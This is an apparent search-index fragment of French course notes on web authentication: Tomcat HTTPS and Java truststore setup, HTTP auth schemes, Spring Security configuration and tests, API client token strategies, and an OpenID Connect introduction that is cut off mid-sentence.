port=\u0026quot;8443\u0026quot; protocol=\u0026quot;org.apache.coyote.http11.Http11Nio2Protocol\u0026quot; maxThreads=\u0026quot;20\u0026quot; SSLEnabled=\u0026quot;true\u0026quot; scheme=\u0026quot;https\u0026quot; secure=\u0026quot;true\u0026quot; defaultSSLHostConfigName=\u0026quot;test\u0026quot;\u0026gt; \u0026lt;SSLHostConfig hostName=\u0026quot;test\u0026quot; protocols=\u0026quot;TLSv1.2\u0026quot; \u0026gt; \u0026lt;Certificate certificateFile=\u0026quot;${catalina.home}/conf/ssl/server.crt\u0026quot; certificateKeyFile=\u0026quot;${catalina.home}/conf/ssl/server.key\u0026quot; /\u0026gt; \u0026lt;/SSLHostConfig\u0026gt; \u0026lt;/Connector\u0026gt;  Configuration de la redirection du connecteur par dÃ©faut # On dÃ©finie le port de redirection dans le cas ou une redirection https est imposÃ©e par l\u0026rsquo;application\nCe connecteur existe dÃ©jÃ  par dÃ©faut, il faut uniquement changer le port de redirection si nÃ©cessaire\n\u0026lt;Connector connectionTimeout=\u0026quot;20000\u0026quot; port=\u0026quot;8080\u0026quot; protocol=\u0026quot;HTTP/1.1\u0026quot; redirectPort=\u0026quot;8443\u0026quot;/\u0026gt;  Rendre le https obligatoire # web.xml (Tomcat)\n\u0026lt;security-constraint\u0026gt; \u0026lt;display-name\u0026gt;tout-en-https\u0026lt;/display-name\u0026gt; \u0026lt;web-resource-collection\u0026gt; \u0026lt;web-resource-name\u0026gt;tout\u0026lt;/web-resource-name\u0026gt; \u0026lt;url-pattern\u0026gt;/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/web-resource-collection\u0026gt; \u0026lt;user-data-constraint\u0026gt; \u0026lt;transport-guarantee\u0026gt;CONFIDENTIAL\u0026lt;/transport-guarantee\u0026gt; \u0026lt;/user-data-constraint\u0026gt; \u0026lt;/security-constraint\u0026gt;  Spring Security\n@Configuration @EnableWebSecurity public class MySecurityConfiguration { @Bean public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception { http.requiresChannel().anyRequest().requiresSecure(); } }  TP #  GÃ©nÃ©rer un keystore pour une configuration https de localhost Mettre en place https sur un serveur local Forcer le https sur l\u0026rsquo;application  Le truststore en java #   Par dÃ©faut le trustore chargÃ© est celui de la jvm Ã©xÃ©cutant l\u0026rsquo;application (\u0026hellip;.\\mon-jdk\\lib\\security\\cacerts)\n  Le mot de passe par dÃ©faut est changeit\n  On peut vouloir un \u0026ldquo;Insee flavored cacert\u0026rdquo; : le cacerts disponible dans la distribution java plus la chaine de certification Insee (AC Racine + AC SubordonnÃ©e)\n  Au cas oÃ¹ : certificats AC Insee\n  Pour le changer on utilise des paramÃ¨tres de la JVM :\n javax.net.ssl.trustStrore javax.net.ssl.trustStorePassword javax.net.ssl.trustStoreType (par dÃ©faut jks)    On crÃ©e un nouveau truststore, en pratique on ajoute nos certificats au truststore par dÃ©faut\n  CrÃ©er le truststore\n  keytool -import -trustcacerts -file server.crt -alias localhost -keystore cacertsperso  Si keytool inconnu : (Ã  ajouter au path pour plus de simplicitÃ©)\n\u0026quot;path/to/mon-jdk/bin/keytool.exe\u0026quot; \u0026quot;$JAVA_HOME/bin/keytool.exe\u0026quot;  CrÃ©e le truststore si cacertsperso n\u0026rsquo;existe pas encore, ajoute le certificat aux existants s\u0026rsquo;il existe dÃ©jÃ \n Le dÃ©clarer au dÃ©marrage :  ParamÃ¨tres de dÃ©marrage    -Djavax.net.ssl.trustStore=\u0026quot;/path/to/cacerts.jks\u0026quot; -Djavax.net.ssl.trustStorePassword=changeit -Djavax.net.ssl.trustStoreType=JKS -Djavax.net.debug=all (UNIQUEMENT pour debugger en cas de problÃ¨me, c'est TRES verbeux)   Dans le code :  System.setProperty(\u0026quot;javax.net.ssl.trustStore\u0026quot;, \u0026quot;/path/to/cacerts.jks\u0026quot;); System.setProperty(\u0026quot;javax.net.ssl.trustStorePassword\u0026quot;, \u0026quot;changeit\u0026quot;); System.setProperty(\u0026quot;javax.net.ssl.trustStoreType\u0026quot;, \u0026quot;JKS\u0026quot;);  TP #  CrÃ©er un truststore incluant le cacert Insee et le certificat gÃ©nÃ©rÃ© prÃ©cÃ©demment Le faire prendre en compte dans l\u0026rsquo;application  "}).add({id:10,href:"/docs/authentification/principes/",title:"Les grands principes de l'authentification",description:"Qu\u0026rsquo;est qu\u0026rsquo;une personne authentifiÃ©e #  Une personne connue de l\u0026rsquo;application Elle est donc enregistrÃ©e Comment stocker cette information ? Type de base de donnÃ©e dÃ©diÃ©e : l\u0026rsquo;annuaire  Qu\u0026rsquo;est que l\u0026rsquo;authentification #  Validation d\u0026rsquo;une identification Un utilisateur doit indiquer qui il est (identifiant, certificat client) et le prouver (mot de passe, certifcat client, carte Ã  puce, code Ã  usage unique, empreinte digitale) Au moins un facteur, mais plusieurs facteurs simultanÃ©s amÃ©liorent la preuve (mot de passe + carte Ã  puce)  Le SSO - Single Sign On #  S\u0026rsquo;identifier une seule fois pour accÃ©der Ã  plusieurs services SystÃ¨me d\u0026rsquo;authentification centralisÃ© Question du SLO  Logout = dÃ©connexion de l\u0026rsquo;application uniquement ?",content:"Qu\u0026rsquo;est qu\u0026rsquo;une personne authentifiÃ©e #  Une personne connue de l\u0026rsquo;application Elle est donc enregistrÃ©e Comment stocker cette information ? Type de base de donnÃ©e dÃ©diÃ©e : l\u0026rsquo;annuaire  Qu\u0026rsquo;est que l\u0026rsquo;authentification #  Validation d\u0026rsquo;une identification Un utilisateur doit indiquer qui il est (identifiant, certificat client) et le prouver (mot de passe, certifcat client, carte Ã  puce, code Ã  usage unique, empreinte digitale) Au moins un facteur, mais plusieurs facteurs simultanÃ©s amÃ©liorent la preuve (mot de passe + carte Ã  puce)  Le SSO - Single Sign On #  S\u0026rsquo;identifier une seule fois pour accÃ©der Ã  plusieurs services SystÃ¨me d\u0026rsquo;authentification centralisÃ© Question du SLO  Logout = dÃ©connexion de l\u0026rsquo;application uniquement ? Ou dÃ©connexion de l\u0026rsquo;application et du fournisseur d\u0026rsquo;identitÃ© ? Ou encore, de l\u0026rsquo;application, du fournisseur, et de toutes les autres applis s\u0026rsquo;Ã©tant connectÃ©es via le fournisseur ?    Annuaire # RÃ©fÃ©rentiel permettant de stocker des donnÃ©es de maniÃ¨re hiÃ©rarchique et offrant des mÃ©canismes pour rechercher efficacement l\u0026rsquo;information.\n Recensement des informations sur les utilisateurs, sur les applications, sur un parc informatique Authentifier un utilisateur Donner un droit d\u0026rsquo;un objet sur un autre, gestion de groupes (hierarchie)  Technologies d\u0026rsquo;annuaires\n OpenLDAP : projet opensource Active Directory (AD) : solution Microsoft.  Ressource authentifiÃ© # Les besoins d\u0026rsquo;authentification sont variÃ©s.\nUne application peut proposer :\n  Du contenu public (donc sans authentification)\n  Du contenu accessible Ã  n\u0026rsquo;importe quel utilisateur authentifiÃ©\n  Du contenu accessible Ã  certains utilisateurs\n  Authentification explicite : je prÃ©sente un en-tÃªte \u0026ldquo;Authorization\u0026rdquo; dans ma requÃªte\n  Authentification implicite : je m\u0026rsquo;attends Ã  ce que l\u0026rsquo;application me donne un moyen de m\u0026rsquo;authentifier\n  En arrivant sur une page oÃ¹ je suis censÃ© Ãªtre authentifiÃ©\n Je prÃ©sente un header \u0026ldquo;Authorization\u0026rdquo; ? Si oui et que l\u0026rsquo;application l\u0026rsquo;accepte je suis authentifiÃ© Sinon, l\u0026rsquo;application peut me proposer des moyens de m\u0026rsquo;authentifier S\u0026rsquo;il n\u0026rsquo;y a pas d\u0026rsquo;autres moyens que le header Authorization ou que j\u0026rsquo;ai dÃ©jÃ  tentÃ© tous les modes possibles sans succÃ¨s, je reÃ§ois dÃ©finitivement une erreur 401 \u0026ldquo;Unauthorized\u0026rdquo;  Si un ou plusieurs autre modes de connexion sont disponibles, les fonctionnements sont variÃ©s :\n  401 + WWW-Authenticate header : le navigateur doit savoir rÃ©agir\n  200 + traitements divers ou 30X : redirection vers page de login ou vers un fournisseur d\u0026rsquo;identitÃ©\n  Exemple : l\u0026rsquo;authentification Basic\n  Authorization: Basic Base64(identifiant:motdepasse)   Si un site propose l\u0026rsquo;authentification Basic, et que l\u0026rsquo;on vient sans l\u0026rsquo;entÃªte authorisation, le site rÃ©pond avec l\u0026rsquo;entÃªte :  WWW-Authenticate: Basic realm=\u0026quot;nom d'affichage\u0026quot;   Le navigateur voyant cet entÃªte affiche Ã  l\u0026rsquo;utilisateur une pop-up demandant un identifiant et mot de passe et ayant pour titre le \u0026ldquo;nom d\u0026rsquo;affichage\u0026rdquo; Le navigateur utilisera ce couple identifiant mot de passe pour former l\u0026rsquo;en-tÃªte Authorisation tout le reste de la session  Je suis correctement identifiÃ© mais la ressource ne s\u0026rsquo;adresse qu\u0026rsquo;Ã  un certain type d\u0026rsquo;utilisateur dont je ne fais pas partie :\n Erreur 403 Forbidden   Rappel code rÃ©ponse HTTP :\n 20X : succÃ¨s 30X : redirection 40X : erreur cÃ´tÃ© Client Web 50X : erreur cÃ´tÃ© Serveur Web     200 : OK 301 : Moved Permanently 302 : Found (DÃ©placÃ© temporairement) 400 : Bad Request 401 : Unauthorized 403 : Forbidden 404 : Not Found 418 : Iâ€™m a teapot (RFC 2324) 500 : Internal Server Error 503 : Service Unavailable : rÃ©ponse fournie par un reverse proxy si l\u0026rsquo;application n\u0026rsquo;est pas disponible (maintenance par exemple)   401 ou 403 ?\n 401 : Unauthorized : L\u0026rsquo;authentification ne s\u0026rsquo;est pas dÃ©rolÃ©e comme prÃ©vue ou elle s\u0026rsquo;est bien dÃ©roulÃ©e mais l\u0026rsquo;utilisateur est inconnu de l\u0026rsquo;application 403 : Forbidden : L\u0026rsquo;authentification s\u0026rsquo;est bien dÃ©roulÃ©e et l\u0026rsquo;utilisateur est connu mais il n\u0026rsquo;a pas les habilitations nÃ©cessaires  Mise en pratique : comment savoir si l\u0026rsquo;utilisateur a les droits ? # Le mode d\u0026rsquo;authentification peut simplement prÃ©senter une identifiation. C\u0026rsquo;est alors Ã  moi de dÃ©terminer si l\u0026rsquo;utilisateur a le droit d\u0026rsquo;accÃ©der Ã  la ressource et d\u0026rsquo;afficher les bonnes informations.\nM Robichu se connecte Ã  mon questionnaire en ligne.\nIl a pu s\u0026rsquo;authentifier correctement sur l\u0026rsquo;application, la seule information connue de l\u0026rsquo;application est alors son identifiant.\nL\u0026rsquo;application recherche en base de donnÃ©es l\u0026rsquo;identifiant de M Robichu et rÃ©cupÃ¨re bien une ligne qui contient notamment les informations dÃ©jÃ  renseignÃ©es par M Robichu.\nJe sais donc que M Robichu a les droits sur l\u0026rsquo;application et je peux en plus prÃ©remplir le questionnaire avec ce que je sais dÃ©jÃ \nLe mode d\u0026rsquo;authentification peut fournir une rÃ©ponse plus complÃ¨te contenant des rÃ´les. Je peux alors me servir de ces rÃ´les rÃ©cupÃ©rÃ©s pour gÃ©rer l\u0026rsquo;accÃ¨s Ã  mes ressources.\nM Robichu se connecte Ã  mon questionnaire en ligne.\n*Il a pu s\u0026rsquo;authentifier correctement sur l\u0026rsquo;application, les informations connues de l\u0026rsquo;application sont maintenant son identifiant mais aussi une liste de rÃ´les dont \u0026ldquo;repondant-enquete-satisfaction-joint-etancheite-climatiseur-morgue\u0026rdquo;. *\nJe sais directement que M Robichu a les droits sur l\u0026rsquo;application. Mais rien ne m\u0026rsquo;empÃªche de chercher en base de donnÃ©es des informations plus prÃ©cises sur M Robichu\nRÃ´les dans l\u0026rsquo;authentification ou en base de donnÃ©es ?\nSe limiter au rÃ´les le plus brut possible dans le systÃ¨me d\u0026rsquo;authentification (rÃ©pondant, administrateur)\nÃ‰viter de trop spÃ©cifier le rÃ´le surtout si l\u0026rsquo;on possÃ¨de l\u0026rsquo;information en base de donnÃ©es. (rÃ©pondant Ã  l\u0026rsquo;enquÃªte X, Ã  l\u0026rsquo;enquÃªte Y, etc.)\nQuelques exemples d\u0026rsquo;authentification # Authentifications directes :\n Basic Formulaire Certificat Client Kerberos : adaptÃ© au Web par SPNEGO, Simple and Protected GSSAPI (Generic Security Services Application Program Interface) Negotiation Mechanism, implÃ©mentÃ© par AD NTLM (NT Lan Manager) : SystÃ¨mes Windows ou compatible AD  Authentifications centralisÃ©es nÃ©cessitant l\u0026rsquo;utilisation d\u0026rsquo;un autre mode :\n SAML OpenID Connect  Kerberos # WWW-Authenticate: Negociate\n SystÃ¨me d\u0026rsquo;Ã©change de jeton basÃ© sur des clÃ©s symÃ©triques (dÃ©duites des mots de passes)  https://blog.devensys.com/kerberos-principe-de-fonctionnement/\nNTLM # Kerberos simplifiÃ© et moins sÃ©curisÃ©\nWWW-Authenticate: NegociateNTLM\n Envoi de l\u0026rsquo;identifiant Challenge du serveur, Ã  rÃ©soudre avec le hash du mot de passe Le serveur demande Ã  AD de valider (identifiant,challenge, rÃ©ponse du client) AD rÃ©pond au serveur si l\u0026rsquo;authentification est OK  Authentifications Kerberos ou NTLM : SÃ©curitÃ© #  Afin de contrÃ´ler ce flux, les sources autorisÃ©es Ã  Ã©mettre une demande de challenge sont contrÃ´lÃ©es Dans Firefox, il s\u0026rsquo;agit des propriÃ©tÃ©s suivantes (about:config)  network.negotiate-auth.delegation-uris : insee.intra,insee.fr,insee.test,insee.eu,localhost network.negotiate-auth.trusted-uris : insee.intra,insee.fr,insee.test,insee.eu,localhost network.automatic-ntlm-auth.trusted-uris :  Plus d\u0026rsquo;informations : https://developer.mozilla.org/en-US/docs/Mozilla/Integrated_authentication\nConfidentialitÃ© de l\u0026rsquo;authentification #  Kerberos, NTLM, SAML : SÃ©curitÃ© intrinsÃ¨que (mÃªme sur un canal en clair, une lecture rÃ©seau ne permet pas d\u0026rsquo;obtenir des informations sur les credentials de l\u0026rsquo;utilisateur) Certificat client : Ã‰tape du protocole HTTPS Formulaire, Basic, OIDC : SÃ©curitÃ© basÃ©e sur un canal chiffrÃ© (HTTPS)  Utilisation d\u0026rsquo;une fÃ©dÃ©ration d\u0026rsquo;identitÃ© #  On verra le fonctionnement en dÃ©tail plus tard (SAML, OpenIDConnect) Principe : dÃ©lÃ©guer l\u0026rsquo;authentification Ã  un autre systÃ¨me (Kerberos et NTLM sont au fond des fÃ©dÃ©rations d\u0026rsquo;identitÃ©) IntÃ©rÃªts :  Authentification centralisÃ©e Ã‰viter les accÃ¨s directs aux annuaires SSO AmÃ©lioration de la sÃ©curitÃ© : la sÃ©curitÃ© est Ã©galement dÃ©lÃ©guÃ©e au protocole et au systÃ¨me authentifiant, reduction de la surface d\u0026rsquo;attaque Cependant la sÃ©curitÃ© du client reste Ã  la charge des applications    "}).add({id:11,href:"/docs/authentification/java/",title:"L'authentification en java",description:"ImplÃ©mentation de l\u0026rsquo;authentification en Java #  Consiste Ã  mettre un objet dans le \u0026ldquo;user principal\u0026rdquo; de la request Le principal doit hÃ©riter de la classe abstraite \u0026ldquo;Principal\u0026rdquo; Chaque implÃ©mentation de l\u0026rsquo;authentification a sa classe de principal  3 grands types de solution :\n Pur Java EE (Jakarta EE) : le filtre  Projet Pac4j   BasÃ© sur le container (valve Tomcat) Spring security  Filter #  Se dÃ©finit dans web.",content:"ImplÃ©mentation de l\u0026rsquo;authentification en Java #  Consiste Ã  mettre un objet dans le \u0026ldquo;user principal\u0026rdquo; de la request Le principal doit hÃ©riter de la classe abstraite \u0026ldquo;Principal\u0026rdquo; Chaque implÃ©mentation de l\u0026rsquo;authentification a sa classe de principal  3 grands types de solution :\n Pur Java EE (Jakarta EE) : le filtre  Projet Pac4j   BasÃ© sur le container (valve Tomcat) Spring security  Filter #  Se dÃ©finit dans web.xml Se lance avant chaque requÃªte correspondant au filter-mapping Selon l\u0026rsquo;implÃ©mentation, peut contenir une gestion de role (attention Ã  l\u0026rsquo;ordre des filtres), mais les gestions les plus fines peuvent se faire dans un autre filtre, voire directement dans le code  exemple du filtre pac4j :\n\u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;zoneAuthentifieeFilter\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;org.pac4j.jee.filter.SecurityFilter\u0026lt;/filter-class\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;configFactory\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;fr.insee.demo.security.DemoConfigFactory\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;zoneAuthentifieeFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt;  (pac4j fonctionne avec l\u0026rsquo;Ã©criture d\u0026rsquo;une classe de configuration)\nRemarque : En Spring, on peut simplement dÃ©finir un filtre\n@Filter @Order(n) public class MyFilter implements Filter{ }    Principe Java EE : requÃªte entrante matÃ©rialisÃ©e par un objet HTTPServletRequest\n  Les implÃ©mentations d\u0026rsquo;authentification sont censÃ©es placer certaines informations dans cet objet de requete.\n  Quelques mÃ©thodes de l\u0026rsquo;interface HTTPServletRequest :\n getRemoteUser, getUserPrincipal pour vÃ©rifier que l\u0026rsquo;utilisateur est authentifiÃ© (non null si authentifiÃ©) isUserInRole pour vÃ©rifier que l\u0026rsquo;utilisateur a un droit donnÃ© isSecure pour vÃ©rifier que la connexion rÃ©seau est sÃ©curisÃ©e    Spring security #  Plus lourd en dÃ©pendances NÃ©cessite une base Spring ou Spring Boot plus facile sur un projet neuf : crÃ©er un modÃ¨le complet de dÃ©pendances sur start.spring.io ajout du module \u0026ldquo;security\u0026rdquo;, ainsi que des sous modules correspondant Ã  l\u0026rsquo;auhentification souhaitÃ©e (ldap, oauth, \u0026hellip;)  Spring security\n Configuration dans une classe dÃ©diÃ©e  exemple d\u0026rsquo;une conf web service acceptant simultanÃ©ment l\u0026rsquo;authentification basic et oauth\n@Configuration @EnableWebSecurity public class SpringSecurityConfiguration { @Bean public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception { // Cas d'un webservice : // - ne pas gerer les sessions // - pas de csrf http.sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS); http.csrf().disable(); // Descriptions des regles d'accÃ¨s par path http.authorizeHttpRequests( requests -\u0026gt; requests // Ignorer le path du swagger .requestMatchers(HttpMethod.GET, \u0026quot;/swagger-ui/**\u0026quot;, \u0026quot;/v3/api-docs/**\u0026quot;) .permitAll() .requestMatchers(HttpMethod.GET, \u0026quot;/\u0026quot;, \u0026quot;/healthcheck\u0026quot;) .permitAll() .requestMatchers(HttpMethod.GET, \u0026quot;/private\u0026quot;) .authenticated() .requestMatchers(HttpMethod.GET, \u0026quot;/admin\u0026quot;) .hasRole(\u0026quot;admin\u0026quot;) .requestMatchers(HttpMethod.OPTIONS) .permitAll() .anyRequest() .denyAll()); // Moyens d'authentification : Basic + oAuth2 bearer http.httpBasic(); http.oauth2ResourceServer(); return http.build(); } // CONFIGURATION BASIC // Ou vÃ©rifier les credentials passÃ©s en basic ? // ici : users de test en mÃ©moire (PAS PRODUCTION READY :D) @Bean public UserDetailsService userDetailsService() { UserDetails user = User.withUsername(\u0026quot;user\u0026quot;).password(\u0026quot;{noop}password\u0026quot;).roles(\u0026quot;\u0026quot;).build(); UserDetails admin = User.withUsername(\u0026quot;admin\u0026quot;).password(\u0026quot;{noop}password\u0026quot;).roles(\u0026quot;ADMIN\u0026quot;).build(); return new InMemoryUserDetailsManager(user, admin); } }  L\u0026rsquo;objet HttpSecurity http permet de configurer les comportements de sÃ©curitÃ©\n VÃ©rifier le HTTPS :  .requiresChannel().antMatchers(\u0026quot;/**\u0026quot;).requiresSecure()   DÃ©finition page erreur 403 :  .exceptionHandling().accessDeniedPage(\u0026quot;/accessDenied\u0026quot;)   VÃ©rifier les droits :  authorizeRequests().antMatchers(\u0026quot;/public/**\u0026quot;).permitAll().antMatchers(\u0026quot;/private/**\u0026quot;).authenticated().antMatchers(\u0026quot;/admin/**\u0026quot;).hasRole(\u0026quot;admin\u0026quot;)    permitAll() = accÃ¨s public\n  authenticated() = utilisateurs authentifiÃ© sans controle de role\n  hasRole(\u0026ldquo;admin\u0026rdquo;) ou hasAuthority(\u0026ldquo;admin\u0026rdquo;) = utilisateurs authentifiÃ©s avec le rÃ´le \u0026ldquo;admin\u0026rdquo;\n  Principe Authority/Role\n  En spring security, on ajoute des authority\n  Si l\u0026rsquo;authority commence pas \u0026ldquo;ROLE_\u0026rdquo;, elle est considÃ©rÃ©e comme rÃ´le par Spring\n  Dans ce cas lors d\u0026rsquo;un \u0026ldquo;hasRole()\u0026rdquo;, il faut rechercher uniquement \u0026ldquo;monroleapplicatif\u0026rdquo; et non pas \u0026ldquo;ROLE_monroleapplicatif\u0026rdquo;\n  IntÃ©rÃªt de role ?\n Spring Security n\u0026rsquo;ajoutera que les ROLE_* dans les role de l\u0026rsquo;objet HttpRequest Donc les mÃ©thodes l\u0026rsquo;utilisant (isUserInRole par exemple) ne marcheront que dans ces conditions    Exemple : Ajout dans Spring Security des authorities \u0026ldquo;ROLE_utilisateur\u0026rdquo; et \u0026ldquo;user\u0026rdquo;\n  L\u0026rsquo;utilisateur A possÃ¨de \u0026ldquo;ROLE_utilisateur\u0026rdquo; et l\u0026rsquo;utilisateur B \u0026ldquo;user\u0026rdquo;\n  .antMatchers(\u0026quot;/private/**\u0026quot;).hasAuthority(\u0026quot;utilisateur\u0026quot;) autorisera l\u0026rsquo;accÃ¨s Ã  aucun de ces utilisateurs\n  .antMatchers(\u0026quot;/private/**\u0026quot;).hasAuthority(\u0026quot;ROLE_utilisateur\u0026quot;) autorisera l\u0026rsquo;accÃ¨s Ã  l\u0026rsquo;utilisateur A\n  .antMatchers(\u0026quot;/private/**\u0026quot;).hasAuthority(\u0026quot;user\u0026quot;) autorisera l\u0026rsquo;accÃ¨s Ã  l\u0026rsquo;utilisateur B\n  .antMatchers(\u0026quot;/private/**\u0026quot;).hasRole(\u0026quot;utilisateur\u0026quot;) autorisera l\u0026rsquo;accÃ¨s Ã  l\u0026rsquo;utilisateur A\n  .antMatchers(\u0026quot;/private/**\u0026quot;).hasRole(\u0026quot;user\u0026quot;) autorisera l\u0026rsquo;accÃ¨s Ã  aucun de ces utilisateurs\n  Tests avec Spring Security # IdÃ©e : mocker un utilisateur lors d\u0026rsquo;un cas de test\n Lui affecter une identitÃ© Lui affecter des rÃ´les  Srping Security test utilise uniquement l\u0026rsquo;interface Principal de JakartaEE, on ne pourra pas faire mieux que mocker nom et role (en particulier pas de \u0026ldquo;mock token\u0026rdquo;)\n// Runner Spring si Junit 4 (lance un serveur pour les tests) @RunWith(SpringRunner.class) //Runner Spring si Junit 5 (lance un serveur pour les tests) @ExtendWith(SpringExtension.class) // Prepare la conf MVC de la classe en paramÃ¨tre @WebMvcTest(Controlleur.class) public class AuthenticationTest { @Autowired public MockMvc mvc;  La dÃ©pendance spring-security-test propose une annotation @WithMockUser.\nElle permet de peupler le Principal de la requete.\nSe limite Ã  l\u0026rsquo;interface de principal :\n possibilitÃ© de donner un nom (Principal.getName)  attribut \u0026ldquo;username\u0026rdquo;   possibilitÃ© de donner des roles (HttpServletRequest.isUserInRole)  attribut \u0026ldquo;roles\u0026rdquo;    @Test @WithMockUser(username = \u0026quot;Alfred Robichu\u0026quot;, roles = { \u0026quot;administrateur\u0026quot; }) public void recupererPageAdminEnEtantAdmin() throws Exception { mvc.perform(get(\u0026quot;/admin\u0026quot;).secure(true)).andExpect(status().isOk()) .andReturn(); }  "}).add({id:12,href:"/docs/authentification/js/",title:"L'authentification des clients d'API",description:"StratÃ©gies Utilisateur -\u0026gt; Application intermÃ©diaire -\u0026gt; API # StratÃ©gie 1\n L\u0026rsquo;application intermÃ©diaire possÃ¨de le compte admin de l\u0026rsquo;API L\u0026rsquo;application intermÃ©diaire authentifie \u0026ldquo;indÃ©pendemment\u0026rdquo; l\u0026rsquo;utilisateur et est garant de la sÃ©curitÃ© des traitement Pour l\u0026rsquo;API, c\u0026rsquo;est un admin qui s\u0026rsquo;est connectÃ© mÃªme si l\u0026rsquo;utilisateur final a des droits trÃ¨s limitÃ©s Faille sur l\u0026rsquo;application intermÃ©diaire = Ã©lÃ©vation de privilÃ¨ges  StratÃ©gie 2\n L\u0026rsquo;application intermÃ©diaire demande une information d\u0026rsquo;authentification acceptÃ©e par l\u0026rsquo;API (L\u0026rsquo;application intermÃ©diaire peut s\u0026rsquo;en servir pour ses propres traitements) L\u0026rsquo;application intermÃ©diaire transmet cette information Ã  l\u0026rsquo;API Pour l\u0026rsquo;API, c\u0026rsquo;est l\u0026rsquo;utilisateur qui s\u0026rsquo;est connectÃ© et pas un admin L\u0026rsquo;application intermÃ©diaire ne peut plus Ãªtre responsable d\u0026rsquo;attaque par Ã©lÃ©vation de privilÃ¨ge  TransfÃ©rer une authentification ?",content:"StratÃ©gies Utilisateur -\u0026gt; Application intermÃ©diaire -\u0026gt; API # StratÃ©gie 1\n L\u0026rsquo;application intermÃ©diaire possÃ¨de le compte admin de l\u0026rsquo;API L\u0026rsquo;application intermÃ©diaire authentifie \u0026ldquo;indÃ©pendemment\u0026rdquo; l\u0026rsquo;utilisateur et est garant de la sÃ©curitÃ© des traitement Pour l\u0026rsquo;API, c\u0026rsquo;est un admin qui s\u0026rsquo;est connectÃ© mÃªme si l\u0026rsquo;utilisateur final a des droits trÃ¨s limitÃ©s Faille sur l\u0026rsquo;application intermÃ©diaire = Ã©lÃ©vation de privilÃ¨ges  StratÃ©gie 2\n L\u0026rsquo;application intermÃ©diaire demande une information d\u0026rsquo;authentification acceptÃ©e par l\u0026rsquo;API (L\u0026rsquo;application intermÃ©diaire peut s\u0026rsquo;en servir pour ses propres traitements) L\u0026rsquo;application intermÃ©diaire transmet cette information Ã  l\u0026rsquo;API Pour l\u0026rsquo;API, c\u0026rsquo;est l\u0026rsquo;utilisateur qui s\u0026rsquo;est connectÃ© et pas un admin L\u0026rsquo;application intermÃ©diaire ne peut plus Ãªtre responsable d\u0026rsquo;attaque par Ã©lÃ©vation de privilÃ¨ge  TransfÃ©rer une authentification ? #  L\u0026rsquo;authentification repose sur un secret Plus un secret a de gardien moins il est gardÃ© TransfÃ©rer le secret = mauvaise idÃ©e Une seule application va gÃ©rer ce secret, et va Ã©tablir un \u0026ldquo;jeton\u0026rdquo; ou \u0026ldquo;token\u0026rdquo; qui garantie l\u0026rsquo;identitÃ© Les autres applications se transmettent ce token  Authentification avec Javascript #   Frontend en javascript (tout se passe dans le navigateur)\n  AUCUNE protection n\u0026rsquo;est nÃ©cessaire\n  Pourquoi on authentifie en js ?\n Affichage Transmettre l\u0026rsquo;authentification au backend    StratÃ©gie 1 innaplicable\n  On ne peut pas garder un secret en javascript\n  La javascript ne va pas vraiment contÃ´ler l\u0026rsquo;authentification mais la stocker et la transmettre\n  Aspect sÃ©curitÃ© : Stockage du jeton ?\n  Un script R (client lourd en gÃ©nÃ©ral) doit se connecter Ã  une API ? #  Il s\u0026rsquo;agit Ã©galement de rÃ©cupÃ©rer une information d\u0026rsquo;authentification pour la transmettre On n\u0026rsquo;est plus dans un navigateur, seul le mode de rÃ©cupÃ©ration du token va changer  Un batch doit se connecter Ã  une API authentifiÃ©e ? #  Pas d\u0026rsquo;utilisateur final =\u0026gt; pseudo \u0026ldquo;StratÃ©gie 1\u0026rdquo; : on va se connecter Ã  l\u0026rsquo;API au nom de l\u0026rsquo;application et non pas au nom d\u0026rsquo;un utilisateur Cependant on construit la StratÃ©gie 2 pour les situations \u0026ldquo;utilisateurs\u0026rdquo; et on adapte la solution batch Ã  l\u0026rsquo;architecture \u0026ldquo;stratÃ©gie 2\u0026rdquo; =\u0026gt; on utilise quand mÃªme la solution token  "}).add({id:13,href:"/docs/authentification/tomcat/",title:"L'authentification sur tomcat",description:"",content:""}).add({id:14,href:"/docs/authentification/oidc/oidc/",title:"Fonctionnement d'OpenID Connect",description:"Protocole grandement basÃ© sur le protocole OAuth 2.0.\nOAuth2 ne gÃ¨re que l\u0026rsquo;autorisation : il permet d\u0026rsquo;autoriser l\u0026rsquo;accÃ¨s Ã  une ressource en dÃ©lÃ©guant la source de contÃ´le Ã  une autre entitÃ©\nLes systÃ¨me d\u0026rsquo;autorisations sont basÃ©s sur un token : on doit spÃ©cifier Ã  l\u0026rsquo;application consommatrice le moyen de le vÃ©rifier\nUn peu de vocabulaire\n Un resource owner se connecte Ã  une application cliente d\u0026rsquo;un resource server. Le resource server accepte de donner les resources appartenant au resource owner s\u0026rsquo;il lui fournit un jeton obtenu via un authorization server.",content:"Protocole grandement basÃ© sur le protocole OAuth 2.0.\nOAuth2 ne gÃ¨re que l\u0026rsquo;autorisation : il permet d\u0026rsquo;autoriser l\u0026rsquo;accÃ¨s Ã  une ressource en dÃ©lÃ©guant la source de contÃ´le Ã  une autre entitÃ©\nLes systÃ¨me d\u0026rsquo;autorisations sont basÃ©s sur un token : on doit spÃ©cifier Ã  l\u0026rsquo;application consommatrice le moyen de le vÃ©rifier\nUn peu de vocabulaire\n Un resource owner se connecte Ã  une application cliente d\u0026rsquo;un resource server. Le resource server accepte de donner les resources appartenant au resource owner s\u0026rsquo;il lui fournit un jeton obtenu via un authorization server.  On distinguera le client qui correspond Ã  un application ayant besoin d\u0026rsquo;une identitÃ© pour fonctionner de l\u0026rsquo;utilisateur qui est la personne physique qui possÃ¨de une identitÃ©\nLes grands principes # SÃ©quencement # Avertissement : schema simplifiÃ© par rapport Ã  la spec complÃ¨te\nNotre utilisateur Alphone Robichu doit se connecter Ã  l\u0026rsquo;application de gestion. Il doit se connecter en tant qu\u0026rsquo;administrateur sur l\u0026rsquo;application de gestion. L\u0026rsquo;application de gestion fait appel Ã  un web service du service de gestion des stocks. Cet appel 